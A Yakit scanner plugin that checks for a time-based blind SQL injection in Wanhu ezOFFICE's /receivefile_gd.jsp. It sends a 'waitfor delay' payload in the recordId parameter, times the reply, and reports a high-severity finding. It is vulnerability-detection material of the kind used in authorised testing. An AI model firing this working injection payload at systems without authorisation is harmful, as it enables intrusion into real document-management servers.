# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=221;waitfor+delay+'0:0:5'--+- HTTP/1.1
Host:{{params(target)}}
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=F52CBA56B7E5DDEE3F89F055CB76666B; sl-session=TCgGEe6oxWYRww4p1QuvEA==; ana=%E6%A0%87%E5%87%86%E7%AE%A1%E7%90%86%E5%91%98; projectIp=http://192.168.60.156:8899
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
`
	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
	resp_time1=time.Since(begin_time)
    
    if int(resp_time1) > 5000000000{
        yakit.Info("%v found 万户ezOFFICE /receivefile_gd.jsp存在SQL注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("万户ezOFFICE /receivefile_gd.jsp存在SQL注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("万户ezOFFICE /receivefile_gd.jsp存在SQL注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
